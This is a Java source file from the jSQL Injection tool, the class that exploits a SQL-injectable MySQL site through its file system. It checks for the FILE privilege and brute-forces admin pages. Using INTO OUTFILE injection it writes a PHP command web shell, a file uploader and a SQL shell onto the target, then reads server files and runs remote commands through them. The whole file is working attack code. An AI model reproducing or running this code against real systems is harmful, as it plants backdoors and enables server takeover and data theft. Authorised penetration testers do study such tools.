/*******************************************************************************
 * Copyhacked (H) 2012-2014.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.ao;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.InjectionModel;
import com.jsql.model.StoppableLoopIntoResults;
import com.jsql.model.bean.Request;
import com.jsql.tool.StringTool;
import com.jsql.view.GUIMediator;
import com.jsql.view.list.dnd.ListItem;

/**
 * Ressource access object.
 * Get informations from file system, commands, webpage.
 */
public class RessourceAccessObject {
    
    public static final String WEBSHELL_FILENAME
            = "j" + InjectionModel.JSQLVERSION + ".tmp1.php";
    public static final String UPLOAD_FILENAME
            = "j" + InjectionModel.JSQLVERSION + ".tmp2.php";
    public static final String SQLSHELL_FILENAME
            = "j" + InjectionModel.JSQLVERSION + ".tmp3.php";
    
    public boolean endAdminSearch = false;
    
    public void getAdminPage(String string, List<ListItem> list) {
        String fin = string.replaceAll("^https?://[^/]*", "");
        String debut = string.replace(fin, "");
        String chemin = fin.replaceAll("[^/]*$", "");
        ArrayList<String> cheminArray = new ArrayList<String>();
        if (chemin.split("/").length == 0) {
            cheminArray.add("/");
        }
        for (String s: chemin.split("/")) {
            cheminArray.add(s + "/");
        }

        int nb = 0;
        String progressURL = "";
        ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
        CompletionService<AdminPageCallable> taskCompletionService
            = new ExecutorCompletionService<AdminPageCallable>(taskExecutor);
        for (String segment: cheminArray) {
            progressURL += segment;

            for (ListItem s: list) {
                taskCompletionService.submit(new AdminPageCallable(debut + progressURL + s.toString()));
            }
        }

        int submittedTasks = cheminArray.size() * list.size();
        for (int tasksHandled = 0; tasksHandled < submittedTasks
                && !this.endAdminSearch; tasksHandled++) {
            try {
                AdminPageCallable currentCallable
                        = taskCompletionService.take().get();
                if (currentCallable.responseCodeHTTP != null
                        && currentCallable.responseCodeHTTP.indexOf("200 OK") >= 0) {
                    Request request = new Request();
                    request.setMessage("CreateAdminPageTab");
                    request.setParameters(currentCallable.url);
                    GUIMediator.model().interact(request);

                    nb++;
                }
            } catch (InterruptedException e) {
                InjectionModel.LOGGER.error(e, e);
            } catch (ExecutionException e) {
                InjectionModel.LOGGER.error(e, e);
            }
        }

        taskExecutor.shutdown();
        try {
            taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            InjectionModel.LOGGER.error(e, e);
        }

        this.endAdminSearch = false;

        InjectionModel.LOGGER.info(
                "Admin page(s) found: " + nb + "/" + submittedTasks);

        Request request = new Request();
        request.setMessage("EndAdminSearch");
        GUIMediator.model().interact(request);
    }
    
    public void getShell(String path, String url)
            throws PreparationException, StoppableException {
        if (!this.checkFilePrivilege()) {
            return;
        }

        GUIMediator.model().inject(
            GUIMediator.model().initialQuery.replaceAll(
                "1337" + GUIMediator.model().visibleIndex + "7331",
                "(select+0x" + StringTool.strhex("<SQLi><?php system($_GET['c']); ?><iLQS>") + ")"
            ).replaceAll("--++", "")
            + "+into+outfile+\"" + path + WEBSHELL_FILENAME + "\"--+"
        );

        String[] sourcePage = {""};
        String hexResult = new StoppableLoopIntoResults().action(
                "concat(hex(load_file(0x" + StringTool.strhex(path + WEBSHELL_FILENAME) + ")),0x69)",
                sourcePage,
                false,
                1,
                null);

        if ("".equals(hexResult)) {
            GUIMediator.model().sendResponseFromSite("Can't find web shell at " + path + WEBSHELL_FILENAME, sourcePage[0].trim());
            return;
        }

        if ("".equals(url)) {
            url = GUIMediator.model().initialUrl.substring(0, GUIMediator.model().initialUrl.lastIndexOf('/') + 1);
        }

        ArrayList<String> f = new ArrayList<String>();
        f.add(path.substring(path.lastIndexOf('/'), path.length()));
        if (StringTool.hexstr(hexResult).indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1) {
            Request request = new Request();
            request.setMessage("CreateShellTab");
            request.setParameters(path, url);
            GUIMediator.model().interact(request);
        } else {
            InjectionModel.LOGGER.warn("Web shell not usable.");
        }
    }
    
    public void upload(String path, String url, File file) throws PreparationException, StoppableException {
        if (!this.checkFilePrivilege()) {
            return;
        }

        GUIMediator.model().inject(
                GUIMediator.model().initialQuery.replaceAll("1337" + GUIMediator.model().visibleIndex + "7331", "(select+0x" + StringTool.strhex("<SQLi>" +
                        "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>" +
                        "<iLQS>") + ")").replaceAll("--++", "") +
                "+into+outfile+\"" + path + UPLOAD_FILENAME + "\"--+"
                );

        String[] sourcePage = {""};
        String hexResult = new StoppableLoopIntoResults().action(
                "concat(hex(load_file(0x" + StringTool.strhex(path + UPLOAD_FILENAME) + ")),0x69)",
                sourcePage,
                false,
                1,
                null);

        if ("".equals(hexResult)) {
            GUIMediator.model().sendResponseFromSite("Can't find upload file at " + path + UPLOAD_FILENAME, sourcePage[0].trim());
            return;
        }

        if ("".equals(url)) {
            url = GUIMediator.model().initialUrl.substring(0, GUIMediator.model().initialUrl.lastIndexOf('/') + 1);
        }

        ArrayList<String> f = new ArrayList<String>();
        f.add(path.substring(path.lastIndexOf('/'), path.length()));
        if (StringTool.hexstr(hexResult).indexOf("<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>") > -1) {
            
            String crLf = "\r\n";
            URLConnection conn = null;
            OutputStream os = null;
            InputStream is = null;

            try {
                URL url2 = new URL(url + "/" + UPLOAD_FILENAME);
                conn = url2.openConnection();
                conn.setDoOutput(true);

                InputStream imgIs = new FileInputStream(file);
                byte[] imgData = new byte[imgIs.available()];
                imgIs.read(imgData);
                
                String message1 = "";
                message1 += "-----------------------------4664151417711" + crLf;
                message1 += "Content-Disposition: form-data; name=\"u\"; filename=\"" + file.getName() + "\"" + crLf;
                message1 += "Content-Type: binary/octet-stream" + crLf;
                message1 += crLf;

                String message2 = "";
                message2 += crLf + "-----------------------------4664151417711--" + crLf;

                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------4664151417711");
                conn.setRequestProperty("Content-Length", String.valueOf((message1.length() + message2.length() + imgData.length)));

                os = conn.getOutputStream();
                os.write(message1.getBytes());

                int index = 0;
                int size = 1024;
                do {
                    if ((index + size) > imgData.length) {
                        size = imgData.length - index;
                    }
                    os.write(imgData, index, size);
                    index += size;
                } while (index < imgData.length);

                os.write(message2.getBytes());
                os.flush();

                is = conn.getInputStream();

                char buff = 512;
                int len;
                byte[] data = new byte[buff];
                String result = "";
                do {
                    len = is.read(data);

                    if (len > 0) {
                        result += new String(data, 0, len);
                    }
                } while (len > 0);

                imgIs.close();
                
                if (result.indexOf("SQLiy") > -1) {
                    InjectionModel.LOGGER.info("Upload successful.");
                } else {
                    InjectionModel.LOGGER.warn("Upload failed.");
                }
                
                Map<String, Object> msgHeader = new HashMap<String, Object>();
                msgHeader.put("Url", url);
                msgHeader.put("Cookie", "");
                msgHeader.put("Post", "");
                msgHeader.put("Header", "");
                msgHeader.put("Response", StringTool.getHeaders(conn));

                Request request = new Request();
                request.setMessage("MessageHeader");
                request.setParameters(msgHeader);
                GUIMediator.model().interact(request);
            } catch (Exception e) {
                InjectionModel.LOGGER.error(e, e);
            } finally {
                try {
                    os.close();
                } catch (Exception e) {
                    InjectionModel.LOGGER.error(e, e);
                }
                try {
                    is.close();
                } catch (Exception e) {
                    InjectionModel.LOGGER.error(e, e);
                }
            }
        } else {
            InjectionModel.LOGGER.warn("Upload not usable.");
        }
        
        Request request = new Request();
        request.setMessage("EndUpload");
        GUIMediator.model().interact(request);
    }
    
    public boolean checkFilePrivilege() throws PreparationException, StoppableException {
        String[] sourcePage = {""};

        String hexResult = new StoppableLoopIntoResults().action(
                "concat((select+hex(if(count(*)=1,0x" + StringTool.strhex("true") + ",0x" + StringTool.strhex("false") +
                "))from+INFORMATION_SCHEMA.USER_PRIVILEGES+where+grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)and+PRIVILEGE_TYPE=0x46494c45),0x69)", 
                sourcePage,
                false,
                1,
                null);

        if ("".equals(hexResult)) {
            GUIMediator.model().sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
            Request request = new Request();
            request.setMessage("MarkFileSystemInvulnerable");
            GUIMediator.model().interact(request);
            hasFileRight = false;
        } else if (StringTool.hexstr(hexResult).equals("false")) {
            InjectionModel.LOGGER.warn("No FILE privilege");
            Request request = new Request();
            request.setMessage("MarkFileSystemInvulnerable");
            GUIMediator.model().interact(request);
            hasFileRight = false;
        } else {
            Request request = new Request();
            request.setMessage("MarkFileSystemVulnerable");
            GUIMediator.model().interact(request);
            hasFileRight = true;
        }
        
        return hasFileRight;
    }
    
    public boolean hasFileRight = false;
    public boolean endFileSearch = false;
    public void getFile(List<ListItem> list) throws PreparationException, StoppableException {
        if (!checkFilePrivilege()) {
            return;
        }

        int nb = 0;
        ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
        CompletionService<FileCallable> taskCompletionService = new ExecutorCompletionService<FileCallable>(taskExecutor);

        for (ListItem s: list) {
            taskCompletionService.submit(new FileCallable(s.toString()));
        }

        ArrayList<String> duplicate = new ArrayList<String>();
        int submittedTasks = list.size();
        for (int tasksHandled = 0; tasksHandled < submittedTasks && !endFileSearch; tasksHandled++) {
            try {
                FileCallable currentCallable = taskCompletionService.take().get();
                if (!"".equals(currentCallable.fileSource)) {
                    String name = currentCallable.url.substring(currentCallable.url.lastIndexOf('/') + 1, currentCallable.url.length());
                    String content = StringTool.hexstr(currentCallable.fileSource).replace("\r", "");
                    String path = currentCallable.url;

                    Request request = new Request();
                    request.setMessage("CreateFileTab");
                    request.setParameters(name, content, path);
                    GUIMediator.model().interact(request);

                    if (!duplicate.contains(path.replace(name, ""))) {
                        InjectionModel.LOGGER.info(
                                "Shell might be possible in folder "
                                + path.replace(name, ""));
                    }
                    duplicate.add(path.replace(name, ""));

                    nb++;
                }
            } catch (InterruptedException e) {
                InjectionModel.LOGGER.error(e, e);
            } catch (ExecutionException e) {
                InjectionModel.LOGGER.error(e, e);
            }
        }

        taskExecutor.shutdown();
        try {
            taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            InjectionModel.LOGGER.error(e, e);
        }

        endFileSearch = false;

        InjectionModel.LOGGER.info("File(s) found: " + nb + "/" + submittedTasks);
        Request request = new Request();
        request.setMessage("EndFileSearch");
        GUIMediator.model().interact(request);
    }
    
    /**
     * Run a shell command on host.
     * @param cmd The command to execute
     * @param terminalID An unique identifier for terminal
     * @param wbhPath Web path of the shell
     */
    public void executeShell(String cmd, UUID terminalID, String wbhPath) {
        URLConnection connection;
        String result = "";
        try {
            connection = new URL(wbhPath + WEBSHELL_FILENAME + "?c=" + URLEncoder.encode(cmd.trim(), "ISO-8859-1")).openConnection();
            connection.setReadTimeout(60000);
            connection.setConnectTimeout(60000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line, pageSource = "";
            while ((line = reader.readLine()) != null) {
                pageSource += line + "\n";
            }
            reader.close();

            Matcher regexSearch = Pattern.compile("<SQLi>(.*)<iLQS>", Pattern.DOTALL).matcher(pageSource);
            regexSearch.find();

            result = regexSearch.group(1);
            
            Map<String, Object> msgHeader = new HashMap<String, Object>();
            msgHeader.put("Url", wbhPath + WEBSHELL_FILENAME + "?c=" + URLEncoder.encode(cmd.trim(), "ISO-8859-1"));
            msgHeader.put("Cookie", "");
            msgHeader.put("Post", "");
            msgHeader.put("Header", "");
            msgHeader.put("Response", StringTool.getHeaders(connection));
            
            Request request = new Request();
            request.setMessage("MessageHeader");
            request.setParameters(msgHeader);
            GUIMediator.model().interact(request);
        } catch (MalformedURLException e) {
            InjectionModel.LOGGER.error(e, e);
        } catch (IOException e) {
            InjectionModel.LOGGER.error(e, e);
        } finally {
            // Unfroze interface
            Request request = new Request();
            request.setMessage("GetShellResult");
            request.setParameters(terminalID, result, cmd);
            GUIMediator.model().interact(request);
        }
    }

    public void getSQLShell(String path, String url, String user, String pass) throws PreparationException, StoppableException {
        if (!this.checkFilePrivilege()) {
            return;
        }
        
        String s = "<SQLi><?php mysql_connect('localhost',$_GET['u'],$_GET['p']);" +
"$result=mysql_query($r=$_GET['q'])or die('<SQLe>Query failed: '.mysql_error().'<iLQS>');" +
"if(is_resource($result)){" +
    "echo'<SQLr>';" +
    "while($row=mysql_fetch_array($result,MYSQL_NUM))echo'<tr><td>',join('</td><td>',$row),'</td></tr>';" +
"}else if($result==TRUE)echo'<SQLm>Query OK: ',mysql_affected_rows(),' row(s) affected';" +
"else if($result==FALSE)echo'<SQLm>Query failed';" +
                " ?><iLQS>";

        GUIMediator.model().inject(
                GUIMediator.model().initialQuery.replaceAll("1337" + GUIMediator.model().visibleIndex + "7331", "(select+0x" + StringTool.strhex(s) + ")").replaceAll("--++", "") +
                "+into+outfile+\"" + path + SQLSHELL_FILENAME + "\"--+"
                );

        String[] sourcePage = {""};
        String hexResult = new StoppableLoopIntoResults().action(
                "concat(hex(load_file(0x" + StringTool.strhex(path + SQLSHELL_FILENAME) + ")),0x69)",
                sourcePage,
                false,
                1,
                null);

        if ("".equals(hexResult)) {
            GUIMediator.model().sendResponseFromSite("Can't find SQL shell at " + path + SQLSHELL_FILENAME, sourcePage[0].trim());
            return;
        }

        if ("".equals(url)) {
            url = GUIMediator.model().initialUrl.substring(0, GUIMediator.model().initialUrl.lastIndexOf('/') + 1);
        }

        ArrayList<String> f = new ArrayList<String>();
        f.add(path.substring(path.lastIndexOf('/'), path.length()));
        if (StringTool.hexstr(hexResult).indexOf(s) > -1) {
            Request request = new Request();
            request.setMessage("CreateSQLShellTab");
            request.setParameters(path, url, user, pass);
            GUIMediator.model().interact(request);
        } else {
            InjectionModel.LOGGER.warn("SQL shell not usable.");
        }
    }

    public void executeSQLShell(String cmd, UUID terminalID, String wbhPath, String user, String pass) {
        URLConnection connection;
        String result = "";
        try {
            connection = new URL(wbhPath + SQLSHELL_FILENAME + "?q="
                    + URLEncoder.encode(cmd.trim(), "ISO-8859-1")
                    + "&u=" + user + "&p=" + pass).openConnection();
            connection.setReadTimeout(60000);
            connection.setConnectTimeout(60000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line, pageSource = "";
            while ((line = reader.readLine()) != null) {
                pageSource += line + "\n";
            }
            reader.close();

            Matcher regexSearch = Pattern.compile("<SQLi>(.*)<iLQS>", Pattern.DOTALL).matcher(pageSource);
            regexSearch.find();
            
            result = regexSearch.group(1);
            
            Map<String, Object> msgHeader = new HashMap<String, Object>();
            msgHeader.put("Url", wbhPath + SQLSHELL_FILENAME + "?q="
                    + URLEncoder.encode(cmd.trim(), "ISO-8859-1")
                    + "&u=" + user + "&p=" + pass);
            msgHeader.put("Cookie", "");
            msgHeader.put("Post", "");
            msgHeader.put("Header", "");
            msgHeader.put("Response", StringTool.getHeaders(connection));
            
            Request request = new Request();
            request.setMessage("MessageHeader");
            request.setParameters(msgHeader);
            GUIMediator.model().interact(request);
        } catch (MalformedURLException e) {
            InjectionModel.LOGGER.error(e, e);
        } catch (IOException e) {
            InjectionModel.LOGGER.error(e, e);
        } finally {
            // Unfroze interface
            Request request = new Request();
            request.setMessage("GetSQLShellResult");
            request.setParameters(terminalID, result, cmd);
            GUIMediator.model().interact(request);
        }
    }
}
